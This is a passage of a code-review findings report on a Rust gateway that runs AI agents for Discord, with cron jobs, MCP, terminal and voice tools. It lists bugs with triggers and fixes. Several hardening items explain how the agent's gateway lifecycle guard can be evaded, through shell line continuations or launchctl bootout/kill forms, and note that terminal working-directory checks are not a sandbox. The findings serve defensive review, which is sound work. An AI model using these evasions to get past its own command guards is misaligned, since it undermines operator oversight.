### Cutover discovery includes unselected profiles
- Location: src/migrate/cron_cutover.rs:281
- What: Cutover discovers all profile stores although import can select only a subset.
- Trigger: A nonselected profile contains jobs absent from the imported database.
- Impact: Verification aborts the migration after gateway shutdown.
- Fix: Pass the same selected-profile set to cutover discovery and import.

### Dry-run rejects supported sqlite: file URLs
- Location: src/migrate/mod.rs:440
- What: The local SQLite path parser accepts only sqlite:// prefixes.
- Trigger: Run migration --dry-run with DATABASE_URL=sqlite:omon_gateway.db.
- Impact: Dry-run rejects a file URL accepted by SQLx; this is a concrete alternate-input failure, not just naming.
- Fix: Recognize both file URL prefixes while continuing to reject in-memory databases.

### Process disappearance aborts migration verification
- Location: src/migrate/sys.rs:395
- What: macOS process-start lookup returns a hard error when the target disappears between liveness checks.
- Trigger: Hermes exits between pid_alive and proc_pidinfo during shutdown.
- Impact: Migration returns an error even though the process has already stopped.
- Fix: Treat confirmed ESRCH/disappearance as not alive while preserving permission and identity-verification errors.

### Constituent ledger writes discard database errors
- Location: src/ledger/service.rs:207
- What: Parent/constituent inserts and completion updates are not atomic and several Results are ignored.
- Trigger: SQLite locking, storage, or constraint failure occurs after the parent operation succeeds.
- Impact: Grouped message IDs remain unregistered or in-progress while the parent API reports success.
- Fix: Put related parent/constituent mutations in one transaction and propagate every failure.

### Memory search loads and ranks the entire session history
- Location: src/memory/store.rs:106
- What: Search fetches every memory before ranking and applying the requested result limit.
- Trigger: A session accumulates a large retained memory history and searches it repeatedly or concurrently.
- Impact: Working memory and CPU grow with history despite a small result limit; hundreds/thousands of rows alone do not prove realistic OOM.
- Fix: Use indexed candidate selection or bounded pagination/top-k ranking instead of full-history materialization; avoid an arbitrary recent-row cutoff that silently changes search recall.

### Staged memory IDs cannot be addressed through the returned Memory API
- Location: src/memory/store.rs:40
- What: Approval staging returns a Memory carrying a pending-write ID even though no memory row exists.
- Trigger: Write approval is enabled and a caller immediately passes the returned ID to get or delete.
- Impact: Lookup returns None and deletion affects no memory, hiding the staged-versus-stored distinction.
- Fix: Return a distinct Stored/Staged outcome with its appropriate identifier instead of presenting a staged write as stored Memory.

### Acknowledged routing bypasses the drain gate
- Location: src/multiplexer/router.rs:360
- What: `route_awaiting_turn` does not apply the drain check used by plain route.
- Trigger: Backfill or another acknowledged caller submits while an attached drain receiver is already true.
- Impact: New turns start after this API should refuse admissions.
- Fix: Share the admission check across both APIs and repeat it after retirement waits.

### Actor initialization ignores parent-aware event routing
- Location: src/multiplexer/actor.rs:858
- What: Actor initialization resolves profiles from SessionKey without the event's parent-channel metadata.
- Trigger: An event represents its thread as channel_id and supplies its parent only in `parent_chat_id` metadata.
- Impact: A parent-only profile is not applied to the actual actor even though `match_event` can resolve it.
- Fix: Carry initial event routing context into actor creation and preserve the routing identity needed for reload.

### An unresponsive actor blocks GC and its shutdown
- Location: src/multiplexer/gc.rs:24
- What: The timer branch awaits sequential unbounded collection without polling shutdown.
- Trigger: An actor is stuck in dispatcher, database, or cancellation work when GC requests eviction.
- Impact: Later sessions are not collected and `ScaleToZero::shutdown` cannot finish its join.
- Fix: Bound per-session collection and use bounded concurrency with cancellation-safe retirement ownership.

### Bot-profile query errors silently select defaults
- Location: src/multiplexer/actor.rs:793
- What: Actor loading treats bot-profile query failure like an absent row.
- Trigger: Session lookup succeeds but the following bot-profile lookup fails because of SQLite/pool availability.
- Impact: An actor runs with fallback model/prompt/toolsets and may persist those defaults.
- Fix: Propagate database errors and use defaults only for a successfully absent profile.

### Cancelled backpressured sends leak the in-flight count
- Location: src/multiplexer/router.rs:179
- What: Cancellation during mailbox send bypasses the decrement after incrementing `in_flight`.
- Trigger: A full mailbox suspends send and its caller times out or is aborted before send resumes.
- Impact: GC waits forever for a phantom send, stranding that session and delaying sequential collection.
- Fix: Install an RAII decrement/notification guard immediately after incrementing the counter.

### Equivalent channel spellings select prompts nondeterministically
- Location: src/multiplexer/profile_routing.rs:460
- What: Stable sorting preserves randomized HashMap order among keys that normalize to the same numeric ID.
- Trigger: Prompt configuration contains both `"123"` and `"0123"` with different settings.
- Impact: Identical configuration can choose different prompts/toolsets across starts.
- Fix: Reject duplicate normalized channel IDs before constructing routes.

### Guild fallback preempts parent-channel profile selection
- Location: src/multiplexer/profile_routing.rs:302
- What: The direct-channel stage accepts guild-only/catch-all matches before parent-channel lookup.
- Trigger: A thread in channel 300 with parent 200 matches both a parent-200 route and a guild-100 fallback.
- Impact: The guild profile's model/prompt/toolsets win instead of the intended parent profile; no production authorization bypass is inferred.
- Fix: Require an explicit channel target in the direct stage, evaluate the parent next, and defer guild/catch-all rules.

### Idle age includes the last active turn's duration
- Location: src/multiplexer/actor.rs:595
- What: Ordinary turn completion does not refresh the monotonic activity timestamp used for eviction.
- Trigger: A turn lasts longer than idle_timeout without heartbeat and GC checks it immediately after completion.
- Impact: A just-used actor is evicted without its configured idle grace, creating avoidable reload churn.
- Fix: Refresh `last_active_at` at every terminal turn outcome.

### Model selection before session creation is a successful no-op
- Location: src/multiplexer/router.rs:411
- What: SetModel ignores zero affected rows from its UPDATE and returns success without an actor.
- Trigger: Model selection targets a fresh session key with neither a persisted row nor a live actor.
- Impact: The next event uses defaults instead of the acknowledged model.
- Fix: Create/load the actor or upsert session state, and do not acknowledge a zero-row mutation as applied.

### Negative route identifiers broaden execution matching
- Location: src/multiplexer/profile_routing.rs:27
- What: Negative guild/channel/thread IDs deserialize to None, removing their constraints.
- Trigger: Privileged configuration supplies a route such as `{"channel":-1,"model":"other"}`.
- Impact: The malformed targeted profile can become a wildcard; the unused authorization helper does not establish an exploitable production bypass.
- Fix: Reject negative identifiers at deserialization and retain the last valid configuration on reload failure.

### One malformed profile entry discards the entire configured route set
- Location: src/multiplexer/profile_routing.rs:402
- What: A route-array parse error becomes an empty set instead of configuration rejection.
- Trigger: One configured route contains a nonnumeric channel string alongside valid profile overrides.
- Impact: All overrides disappear and execution falls back to defaults; the claimed live access-control bypass was not demonstrated.
- Fix: Return a parse Result and fail startup/reload or retain the previous valid route set.

### Restart-breaker persistence errors disable its threshold
- Location: src/multiplexer/restart_loop_guard.rs:75
- What: Restart history read/write/rename errors are discarded.
- Trigger: The state directory is unwritable or full while repeated crashing resumes occur.
- Impact: Each process sees missing or stale history and can repeatedly resume instead of tripping the breaker.
- Fix: Return and report persistence failures and suppress automatic resume when safety history cannot be maintained.

### Stop acknowledges suspension without successful persistence
- Location: src/multiplexer/actor.rs:567
- What: Stop ignores suspension flush errors before replying successfully.
- Trigger: SQLite fails during Stop and the process exits before a later successful flush.
- Impact: Restart can recover a session that the user was told had stopped.
- Fix: Return flush failures in the stop result and retain the dirty/recovery obligation until suspension is durable.

### Transcript deduplication falsely acknowledges unfinished turns
- Location: src/multiplexer/actor.rs:236
- What: Existing inbound transcript presence is treated as proof of successful execution.
- Trigger: A persisted turn fails, is stopped, or crashes, then backfill replays its nonempty platform message ID.
- Impact: Replay is skipped and acknowledged successfully even though the prior turn never completed.
- Fix: Deduplicate on a durable successful terminal outcome, reusing the existing inbound row for unfinished retries.

### Configured bot count masquerades as connected health
- Location: src/readiness.rs:228
- What: Any positive configured client count is labeled healthy with a `connected_bots` metric.
- Trigger: Main collects readiness before starting the clients, or configured clients never connect.
- Impact: Readiness cannot distinguish configured tokens from operational gateway connections.
- Fix: Keep configuration count separately named and derive connection health from actual shard ready/disconnected state.

### Malformed channel ACL configuration silently broadens access
- Location: src/main.rs:939
- What: Invalid channel IDs are discarded, potentially converting a supplied restriction into an empty list.
- Trigger: An operator supplies `DISCORD_ALLOWED_CHANNELS=123;456`, or a malformed ignored-channel entry, and an otherwise authorized user sends a message outside the intended scope.
- Impact: Intended channel restrictions are not enforced; this requires malformed privileged configuration, not an independently demonstrated attacker-controlled configuration path.
- Fix: Parse security-relevant lists as a Result and reject every malformed nonempty component before startup.

### Mirror fallback is decided before the requested bot is filtered
- Location: src/mirror.rs:147
- What: Any unthreaded row suppresses channel-wide fallback even when it belongs to another bot.
- Trigger: Bot B has an unthreaded row while explicitly requested bot A has only threaded rows in the channel.
- Impact: Lookup returns None without examining A's otherwise eligible candidates.
- Fix: Apply bot constraints before testing whether the preferred unthreaded candidate set is empty.

### Mirroring ignores failed session-recency updates
- Location: src/mirror.rs:51
- What: Transcript insertion and recency update are separate operations, and the second error is discarded.
- Trigger: SQLite fails or the pool closes after insertion but before updating `updated_at`.
- Impact: Mirroring reports success with stale ordering used by later origin lookups.
- Fix: Commit insertion and recency update in one transaction and propagate either error.

### Readiness probes the wrong backend setting and default port
- Location: src/readiness.rs:286
- What: Readiness reads `OMON_APPSERVER_URL` and defaults to 18800 instead of the resolved OMO backend endpoint on 19742.
- Trigger: A default deployment uses the healthy daemon on 19742, or only `OMON_OMO_APPSERVER_URL` is configured.
- Impact: Backend health is falsely degraded, or an unrelated service makes the check falsely pass.
- Fix: Pass resolved interactive and distinct cron backend URLs into readiness instead of reparsing another variable.

### Startup admits work before fallible initialization is complete
- Location: src/main.rs:765
- What: Recovery runs before cron configuration validation, and scheduler startup precedes additional fallible dependency construction.
- Trigger: Cron configuration is invalid, or later pairing-cache/downloader/client initialization fails after replay has started.
- Impact: Startup exits after external side effects without the common shutdown path.
- Fix: Validate configuration and construct fallible dependencies before admitting work; route subsequent errors through shared cancellation and joins.

### Unreadable drain markers are treated as absent
- Location: src/drain_control.rs:217
- What: Marker read failures become None and can reset a previously active drain state.
- Trigger: An existing marker becomes unreadable, contains invalid UTF-8, or encounters a transient filesystem error.
- Impact: Drain requests are suppressed or cancelled without a diagnostic.
- Fix: Distinguish NotFound from read failure, log the path/error, and retain the prior drain state on read failure.

### User matching bypasses cross-bot mirror ambiguity checks
- Location: src/mirror.rs:120
- What: A matching user causes an early return before the lookup verifies bot uniqueness.
- Trigger: Two bots have sessions for the same user and origin, while a mirror request supplies the user but omits `bot_id`.
- Impact: The newest candidate can receive another bot's transcript content.
- Fix: Check bot uniqueness in the user-filtered candidate set before choosing a session in either lookup branch.

### Workspace creation errors are discarded
- Location: src/main.rs:158
- What: Configuration ignores failure to create the workspace directory.
- Trigger: The workspace path is a file, unwritable, or on a full filesystem.
- Impact: Database/daemon startup can proceed with an unusable workspace while losing the original actionable error.
- Fix: Propagate directory-creation failure with its path before starting dependent subsystems.

### FTS cursor order disagrees with relevance order
- Location: src/storage/message_search.rs:161
- What: The search applies an integer message-ID cutoff while ordering by BM25 rank and timestamp.
- Trigger: A client uses returned IDs to page relevance results, or supplies UUID IDs or Slack timestamps differing only in fractional seconds.
- Impact: Pages can omit matches; UUIDs cast to zero and Slack fractions are discarded, rather than all Slack timestamps casting to zero as the lane claimed.
- Fix: Use a cursor covering the actual sort tuple or explicitly provide chronological ordering and a compatible cursor.

### Malformed memory payloads abort scoped listing
- Location: src/storage/db.rs:656
- What: Scope validation propagates a payload decode error while enumerating pending memory writes.
- Trigger: An invalid JSON memory payload or one without session_key is staged or already persisted.
- Impact: All scoped memory listings fail and that item cannot be rejected through the scoped API; valid IDs remain individually accessible, contrary to the lane's broader claim.
- Fix: Validate schema at insertion and quarantine/report malformed rows without aborting the entire listing.

### Pending-write IDs can collide with live rows
- Location: src/storage/db.rs:731
- What: UUIDs are truncated to 32-bit hex IDs and inserts have no collision retry.
- Trigger: A newly generated prefix equals an ID still in pending_writes, increasingly likely with many simultaneously retained rows.
- Impact: That staging operation fails with a unique-key error; lifetime write count alone does not determine the probability.
- Fix: Use full UUIDs or retry primary-key collisions with a fresh ID.

### Unreadable skill directories disappear without an error
- Location: src/tools/skills.rs:96
- What: Skill discovery returns silently when read_dir fails, making unreadable and absent skills indistinguishable.
- Trigger: A configured skill directory still exists but directory enumeration fails with PermissionDenied or an I/O error.
- Impact: Listing/search omits its skills and reading one reports not found instead of identifying the failed directory; this is dependency-error suppression rather than only maintainability.
- Fix: Preserve the directory and error in a warning and report discovery incompleteness to the caller rather than returning an apparently complete listing.

### CDP response bodies have no size cap
- Location: src/tools/browser.rs:79
- What: The full page-list response is decoded before any entry or field limit.
- Trigger: A replaced/misbehaving local CDP service returns a large body, or sustained tab growth produces a huge list.
- Impact: The tool allocates and forwards oversized responses.
- Fix: Cap bytes before JSON decoding and restrict returned entries and fields.

### Concurrent parent creation spuriously rejects a write
- Location: src/tools/file.rs:182
- What: Directory creation treats AlreadyExists as fatal after a prior NotFound lookup.
- Trigger: Two file writes concurrently create different children of the same absent parent.
- Impact: One valid write fails even though the parent now exists.
- Fix: Revalidate an AlreadyExists result with the normal directory and confinement checks; propagate other errors.

### MCP SSE parsing ignores multiline event framing
- Location: src/tools/mcp.rs:313
- What: Individual data lines are parsed as complete JSON instead of being joined at the blank-line event boundary.
- Trigger: A compliant SSE response distributes one JSON result over multiple data fields.
- Impact: The result is discarded and the call times out or reports stream closure.
- Fix: Accumulate bounded data fields until the event delimiter, then parse and correlate the combined payload.

### MCP receive loops accept notifications as results
- Location: src/tools/mcp.rs:151
- What: The first parseable JSON value ends the receive loop before response-ID correlation.
- Trigger: A server emits a progress/log notification before the matching tools/call response.
- Impact: The caller gets an ID mismatch and stdio teardown can discard the actual result after its side effect.
- Fix: Keep receiving bounded frames until the matching result/error and separately handle notifications and server requests.

### MCP requests skip session initialization
- Location: src/tools/mcp.rs:81
- What: A fresh stdio server receives tools/call without initialize or notifications/initialized.
- Trigger: A configured MCP server enforces the required initialization lifecycle.
- Impact: Otherwise valid tool calls fail before execution; this is interoperability failure, not a production process crash.
- Fix: Negotiate protocol/capabilities and retain transport session state before issuing calls.

### Returned text can exceed the configured byte cap
- Location: src/tools/terminal.rs:561
- What: Lossy decoding can expand each raw byte and the truncation marker is outside the output budget.
- Trigger: A child returns exactly limit invalid UTF-8 bytes.
- Impact: The response can be roughly three times the nominal cap with truncated=false.
- Fix: Budget encoded output after decoding and reserve space for the marker.

### Search silently omits failed and truncated work
- Location: src/tools/file.rs:330
- What: File read errors are discarded and result-limit completion is indistinguishable from a complete search.
- Trigger: A candidate file is unreadable or the search reaches 1,000 matching lines.
- Impact: Callers can treat incomplete results as exhaustive.
- Fix: Return skipped/error counts and a truncated flag, and surface unexpected I/O failures.

### Dropped audio receivers leave handlers attempting failed sends
- Location: src/voice/mod.rs:49
- What: Send failure breaks only the current tick loop and the handler returns no cancellation request.
- Trigger: An attached listener's receiver is dropped while Songbird continues delivering events.
- Impact: Later callbacks continue allocating/copying frames and attempting sends to a closed channel for the handler's remaining lifetime.
- Fix: Request handler cancellation on closed-channel send failure rather than returning the keep-listening result.

### Empty transcription still invokes LLM and TTS
- Location: src/voice/pipeline.rs:258
- What: Speech processing forwards an empty transcript to language generation and synthesis.
- Trigger: SpeechPipeline receives no frames or STT returns only whitespace for silence.
- Impact: Empty intervals still invoke paid/side-effecting downstream work and can produce unsolicited audio.
- Fix: Return an empty pipeline result before LLM/TTS when the normalized transcript is empty.

### Multi-frame transcription submits only the first frame
- Location: src/voice/pipeline.rs:149
- What: The transcriber accepts a frame slice but encodes only its first frame.
- Trigger: A library caller supplies an utterance containing two or more PCM frames to SpeechPipeline/transcribe.
- Impact: Audio after the first frame is omitted from STT; no production multi-frame voice-capture caller was found to justify P0.
- Fix: Validate matching PCM formats and concatenate all supplied frames into the WAV payload.

### Raw Opus packets are mislabeled as an Ogg file
- Location: src/voice/pipeline.rs:153
- What: The transcriber sends raw Opus bytes with filename `audio.ogg` without creating an Ogg container.
- Trigger: A caller passes an AudioPayload::Opus containing a raw packet rather than an already encoded Ogg file.
- Impact: The STT endpoint receives an invalid audio file and rejects or cannot decode it.
- Fix: Decode/concatenate PCM into WAV or encapsulate the packets in a valid supported container before upload.

### Form inputs lack accessibility labels
- Location: web/src/App.tsx:1104
- What: Cron form labels are not associated with their input elements.
- Trigger: A screen reader focuses the Job ID input or another similarly unlinked field.
- Impact: The visible label may not be announced as the input's accessible name.
- Fix: Add `htmlFor="job-id"` on `<label>` and matching `id="job-id"` on `<Input>`.

### Live logs stay disconnected after a transient socket closure
- Location: web/src/App.tsx:1434
- What: Live logs do not reconnect after the socket closes.
- Trigger: The gateway restarts or a transient connection failure closes the telemetry socket.
- Impact: Streaming stays disconnected until remount; the existing badge reports Disconnected and no JavaScript crash is established.
- Fix: Provide bounded-backoff reconnection with effect cleanup, or a manual Reconnect action; preserve the existing disconnected indicator.

### Missing cleanup and race condition on session message fetching in ChatPlaygroundPage
- Location: web/src/App.tsx:524
- What: Session history requests publish results without checking that the session is still selected.
- Trigger: The user switches A then B and A's slower response arrives after B's.
- Impact: A's messages overwrite the visible history for selected session B.
- Fix: Use an active/cancelled flag inside `useEffect` or an `AbortController` to abort stale in-flight fetches when `currentSessionId` changes.

### Missing debounce or abort on search input creates request storms and race conditions
- Location: web/src/App.tsx:1155
- What: Search requests can update results after their query has been superseded.
- Trigger: A user types successive queries and an earlier request completes after a later one.
- Impact: The table shows stale results; request frequency also increases with every keystroke.
- Fix: Abort or generation-check obsolete search requests before publishing results; optionally debounce to reduce request volume.

### Modal dialog backdrop lacks escape key listener and focus trapping
- Location: web/src/components/ui/dialog.tsx:10
- What: The custom modal lacks focus trapping, Escape handling, and modal accessibility semantics.
- Trigger: A keyboard user opens the dialog and tabs or presses Escape.
- Impact: Focus can leave the dialog and expected dismissal does not work.
- Fix: Use an accessible dialog primitive, or implement modal semantics, focus trapping/restoration, and Escape dismissal.

### Pending approvals badge in header lacks accessible role and keyboard activation
- Location: web/src/App.tsx:247
- What: The approvals navigation badge is a clickable span without keyboard semantics.
- Trigger: A keyboard-only or assistive-technology user tries to activate the badge.
- Impact: This shortcut is not keyboard-accessible.
- Fix: Use a native button with the existing selectPage handler for built-in keyboard activation and focus semantics.

### Stop clears UI state without confirmed backend cancellation
- Location: web/src/App.tsx:624
- What: Stop uses a new socket and clears local sending state without awaiting a stop acknowledgement.
- Trigger: The new WebSocket handshake fails or the server cannot process the stop before the client retires the socket.
- Impact: The UI appears stopped while the backend turn may continue; the 500 ms timer starts after onopen, not before connection establishment.
- Fix: Use POST /api/sessions/{id}/stop and await its response before reporting cancellation, with visible failure handling.

### Unconditional scrollIntoView on every message chunk disrupts user reading during streaming
- Location: web/src/App.tsx:531
- What: Each streamed update scrolls to the bottom without respecting the user's current position.
- Trigger: The user scrolls up to read older content during an active streaming response.
- Impact: Incoming chunks repeatedly disrupt reading by forcing the viewport back down.
- Fix: Check whether the user is scrolled near the bottom (e.g., `scrollTop + clientHeight >= scrollHeight - 50`) before invoking `scrollIntoView`.

### Debouncer coalescing test depends on a real-time scheduling window
- Location: src/discord/adapter.rs:4148
- What: The debounce test relies on real scheduler windows for batch membership and absence assertions.
- Trigger: The test task is descheduled between enqueues or before the negative timeout expires.
- Impact: Correct code can fail the test nondeterministically.
- Fix: Use paused Tokio time, enqueue all inputs before explicitly advancing the virtual clock, then synchronize completion of all timer work and inspect the collected events without a real-time absence window.

### Heartbeat tests still depend on scheduler timing
- Location: src/discord/approval.rs:1051
- What: Heartbeat tests assert real-time ordering and an empty receive buffer after resolution.
- Trigger: The test task is delayed long enough for another pre-resolution heartbeat or the short approval deadline.
- Impact: Tests can fail without any post-resolution heartbeat defect.
- Fix: Use Tokio's controlled clock to advance to explicit heartbeat events, resolve before deliberately advancing to the deadline, and verify producer termination separately from already-buffered events. Bound event waits; drain/count pre-resolution events rather than requiring the buffer to be empty.

### Descendant cleanup test relies on an arbitrary sleep
- Location: src/main.rs:1007
- What: The test substitutes a fixed delay for a child-exit/reaping completion signal.
- Trigger: Scheduler or reaper timing differs from the assumed 100 ms grace.
- Impact: Test results depend on timing rather than the production cleanup completion boundary.
- Fix: Establish child startup with a handshake and await bounded exit/reaping completion without fixed sleeps.

### Cron tests race execution completion with fixed sleeps
- Location: tests/test_cron_schedule_parity.rs:201
- What: Tests inspect persisted results 50ms after spawning due work.
- Trigger: Executor completion or SQLite persistence takes longer than 50ms on a loaded runner.
- Impact: Assertions fail based on scheduling luck.
- Fix: Subscribe before triggering work to a completion event emitted after persistence and await it with a bounded timeout.

### Python tests import an external home-directory script
- Location: tests/test_katok_digest_page.py:8
- What: Test collection dynamically imports a script outside the repository.
- Trigger: Run pytest on a machine without the specified home-directory script.
- Impact: Collection fails, typically with FileNotFoundError rather than the asserted lane error type.
- Fix: Ship the tested script in its owning project and resolve it relative to the test, or place this integration suite with its declared external dependency.

### Wiring test races actor completion with a fixed sleep
- Location: tests/test_wiring_e2e.rs:273
- What: The test asserts backend and database state after an uncoordinated 150ms delay.
- Trigger: A loaded runner schedules actor persistence after that delay.
- Impact: Correct async behavior produces nondeterministic test failures.
- Fix: Subscribe to the exact completion/persistence signal before route and await it with a bounded timeout.

## P2 — cleanup and hardening

### Derived configuration Debug exposes secret fields when formatted
- Location: src/agent/llm.rs:28
- What: LlmConfig and OmoBackendConfig derive Debug with raw API/auth-token fields.
- Trigger: A caller formats those configurations with Debug; an actual logging/exposure site was not established.
- Impact: Future diagnostics could disclose secrets, but the lane's claimed live plaintext leakage is unverified.
- Fix: Implement redacted Debug formatting for secret fields in both configuration types.

### Gateway lifecycle guard regexes bypassed by multiline commands and line continuations
- Location: src/cron/guard.rs:14
- What: The lifecycle regex misses shell line continuations between command action and target.
- Trigger: An already command-authorized operator supplies systemctl restart followed by a backslash-newline and omon-gateway.
- Impact: A best-effort lifecycle safeguard is bypassed, not a demonstrated new execution privilege.
- Fix: Normalize shell continuations and inspect parsed executable argv; keep this as an operator safeguard rather than an authorization boundary.

### Modern macOS launchctl subcommands (`bootout`, `kill`) bypass gateway lifecycle guard
- Location: src/cron/guard.rs:10
- What: The launchctl lifecycle pattern omits modern bootout and kill forms.
- Trigger: An operator with launchctl authority schedules bootout or kill against the gateway service.
- Impact: The guard misses a privileged lifecycle operation; it is not an unprivileged authorization boundary.
- Fix: Include `bootout`, `kill`, `bootstrap`, and `reboot` in the launchctl subcommands alternation list.

### Native cron execution omits gateway lifecycle check on assembled prompt
- Location: src/cron/executor.rs:477
- What: The native assembled prompt is injection-scanned without a separate lifecycle scan.
- Trigger: A command-authorized operator creates a native prompt requesting gateway lifecycle changes.
- Impact: This is inconsistent best-effort policy coverage, not demonstrated direct command execution or privilege escalation.
- Fix: Add `check_gateway_lifecycle(&task)?;` before dispatching the inbound message.

### Script timeout scope is per attempt rather than explicitly total
- Location: src/cron/executor.rs:409
- What: Script timeout is per retry attempt rather than an explicitly shared deadline.
- Trigger: No normal loader-failure path consuming three full timeouts was demonstrated; timeout itself returns without retry.
- Impact: The total-versus-per-attempt budget contract is unclear, not a proven three-times timeout defect.
- Fix: Document whether timeout is per attempt; if a total budget is intended, use a shared deadline and deterministic retry-budget tests.

### Standalone tool roots default to the whole home directory
- Location: src/dashboard_runtime.rs:228
- What: Standalone tool roots default to the entire home directory rather than only the workspace.
- Trigger: An operator starts standalone mode without OMON_TOOL_ROOTS.
- Impact: The local administrative agent has broad filesystem scope; the independent remote or unprivileged exploit is not established by this default alone.
- Fix: Restrict default tool roots to `workspace_root` rather than the user's entire `$HOME` directory unless explicitly overridden.

### Dotenv parse errors omit safe location context
- Location: src/migrate/config_import.rs:287
- What: The parser replaces the underlying error with only the environment path.
- Trigger: An operator imports a syntactically invalid dotenv file.
- Impact: Diagnosis is harder, although secret suppression is intentional and correct.
- Fix: Include a safe line/offset or error category without raw secret-bearing text.

### Unused authorization helpers discard route scope and enabled state
- Location: src/multiplexer/profile_routing.rs:235
- What: The helper omits guild/thread context and its fallback at src/multiplexer/profile_routing.rs:242 ignores disabled or unrelated route scope.
- Trigger: A direct helper caller supplies a guild-scoped restriction without guild context or selects a disabled bot-named rule; no production ingress caller was established.
- Impact: The helper can authorize outside its rule scope, but a live bypass is not demonstrated.
- Fix: Remove the unused helper or require complete event context and enabled-route validation before production integration.

### Drain watcher handle is detached rather than supervised
- Location: src/main.rs:877
- What: Main neither polls nor aborts/awaits the watcher handle.
- Trigger: No concrete production panic source in this fixed-nonzero-interval watcher was established; ordinary shutdown leaves it alive until runtime teardown.
- Impact: Task lifecycle ownership is incomplete, but a demonstrated service failure from this alone is absent.
- Fix: Retain the handle and explicitly cancel/reap it on shutdown; supervise unexpected termination.

### Compose credentials are visible to container administrators
- Location: docker-compose.yml:21
- What: Provider and Discord secrets are passed as container environment values.
- Trigger: A user already has Docker inspection or equivalent container/process privileges.
- Impact: Privileged inspection can disclose credentials, not an unprivileged authorization bypass.
- Fix: Support file-backed secrets and mount them read-only when the deployment threat model requires it.

### Lifecycle fixture requires a fixed local port
- Location: tests/test_review_dashboard.rs:308
- What: The specialized dashboard fixture requires ownership of 127.0.0.1:29998.
- Trigger: That fixture runs while another process owns the port.
- Impact: The fixture fails preflight; normal Cargo integration-crate concurrency and an actual cross-suite collision were not established.
- Fix: Bind an ephemeral port and pass the owned endpoint through the isolated child configuration.

### Windows lifecycle driver reports a pass without running on other hosts
- Location: tests/test_review_dashboard.rs:571
- What: The non-Windows driver branch returns Ok before its lifecycle scenario.
- Trigger: Run the outer driver on macOS or Linux without the isolated-child scenario setting.
- Impact: The reported pass does not indicate lifecycle coverage.
- Fix: Separate the platform-gated driver from its reusable child scenario so unsupported platforms do not register a misleading pass.

### Web client relies on the default redirect policy
- Location: src/tools/web.rs:161
- What: The reader client sets a timeout and user agent but no explicit destination-aware redirect policy.
- Trigger: The external reader sends redirects, or a future change replaces reader-based fetching with direct target fetching.
- Impact: Destination constraints would need enforcement on each hop, but the current citation proves neither a non-HTTP(S) scheme bypass nor a reachable unauthorized internal service; the lane's direct-fetch SSRF scenario depends on a future code change.
- Fix: Define an explicit redirect policy alongside the intended egress policy, disabling redirects or validating each destination when such restrictions are required.

### Working-directory validation is not a filesystem sandbox
- Location: src/tools/terminal.rs:354
- What: The child is launched with a checked cwd but inherits host filesystem capabilities.
- Trigger: A permitted program opens an absolute operand outside the workspace.
- Impact: Roots cannot be relied on as a sandbox; a contract requiring OS isolation is not established by this lane.
- Fix: Document the cwd-only boundary; if confinement is required, enforce it with an OS sandbox rather than operand heuristics.

### Workspace identity omits the platform namespace
- Location: src/agent/agent_workspace.rs:48
- What: User/bot workspace categories omit the platform except for the special web case.
- Trigger: Hypothetical integrations provide equal IDs across different platforms; no deployed cross-platform collision was established.
- Impact: The public slug function maps those identities to the same directory, a future isolation hazard rather than proven live tenant crossover.
- Fix: Include a normalized platform namespace when supporting distinct platforms, with an explicit migration for existing workspace identities.

### Execution authority predicate needs an explicit ownership contract
- Location: src/cron/scheduler.rs:1096
- What: Claim predicates admit mirror and unknown authorities rather than positively naming execution ownership.
- Trigger: Duplicate execution additionally requires a separate active Hermes executor, which was not verified in this scope.
- Impact: The authority contract needs clarification or explicit fencing; mirror execution alone is not proven wrong.
- Fix: Define which authorities this scheduler owns, then enforce that explicit allowlist atomically in claims and document any external exclusion protocol.

### Import-time script-body diagnostics depend on late-injected metadata
- Location: src/cron/store.rs:342
- What: Import-time script-body validation depends on metadata injected only after validation.
- Trigger: A normal imported script job lacks _omon_hermes_home in its source extra fields.
- Impact: Import misses early diagnostics, but run_cron_script checks the body again before execution.
- Fix: Pass the store home explicitly into import validation to obtain early script-body diagnostics; retain execution-time validation.

### ApiError leaks internal database error details and schema structure to callers
- Location: src/dashboard.rs:772
- What: SQL errors are returned verbatim in API error messages.
- Trigger: A request encounters a database error; no separate exploit enabled by schema details was demonstrated.
- Impact: The local administrative API discloses internal diagnostics rather than a stable sanitized error.
- Fix: Log detailed error messages internally via `tracing::error!` and return a generic error message (e.g. `"internal database error"`) in the client JSON response.

### Cron API exposes internal lease bookkeeping
- Location: src/dashboard.rs:1572
- What: Cron run responses serialize internal claim tokens and process IDs.
- Trigger: A dashboard client lists cron runs; no API accepting these values as credentials was found in the reviewed router.
- Impact: Internal lease bookkeeping is unnecessarily coupled to the public response, not a proven lease-takeover capability.
- Fix: Omit claim_token from API serialization and retain owner_pid only if a documented diagnostics consumer needs it.

### Dead --insecure CLI and environment option is ignored during host validation
- Location: src/dashboard.rs:100
- What: The insecure option is ignored by unconditional loopback validation.
- Trigger: An operator passes the documented insecure option with a non-loopback host.
- Impact: The option cannot perform its advertised function; removing it is safer than silently widening exposure.
- Fix: Remove or deprecate the ignored insecure option and its contradictory documentation rather than enabling public administration implicitly.

### Static-file serving lacks canonical containment hardening
- Location: src/dashboard.rs:2201
- What: Static-file validation checks lexical components but neither canonical containment nor hidden-file policy.
- Trigger: An operator places secrets or an escaping symlink inside web_root; no such shipped artifact was established.
- Impact: The static server can expose those deliberately present artifacts, making this deployment hardening rather than a routine bypass.
- Fix: Canonicalize the served file and enforce containment in canonical web_root; define an explicit hidden-file policy for production assets.

### serve_static returns HTTP 200 with HTML for /api requests without trailing slash
- Location: src/dashboard.rs:2175
- What: The SPA fallback excludes /api/ paths but not the exact /api path.
- Trigger: A client requests GET /api.
- Impact: The response is HTML with a success status instead of the expected API-not-found response.
- Fix: Check `if uri.path() == "/api" || uri.path().starts_with("/api/")`.

### Injected message transport silently drops reply references
- Location: src/discord/adapter.rs:2756
- What: The injected SendMessage transport omits parsed reply references.
- Trigger: A test or alternate integration configures with_message_transport and sends a reply; a production use was not established.
- Impact: The transport seam differs from the normal Discord path and cannot test reply parity.
- Fix: Enumerate chunks and call send_message_with_reference with should_chunk_reference for the first chunk, matching the normal transport path.

### Public route_message lacks gateway metadata parity
- Location: src/discord/adapter.rs:751
- What: The public routing helper builds a different metadata context from live gateway ingress.
- Trigger: A caller uses route_message for a role-authorized user or a parent-authorized owned thread; no production caller was established in this aggregation.
- Impact: The public seam cannot preserve gateway admission and ownership semantics.
- Fix: Populate roles from the message and resolve/pass the required parent and ownership metadata, or share one context-building entry point with handle_event.

### The per-user thread-session setting is ignored
- Location: src/discord/adapter.rs:1548
- What: The thread_sessions_per_user setting is propagated but ignored in session construction.
- Trigger: An operator changes the setting expecting separate thread-user sessions.
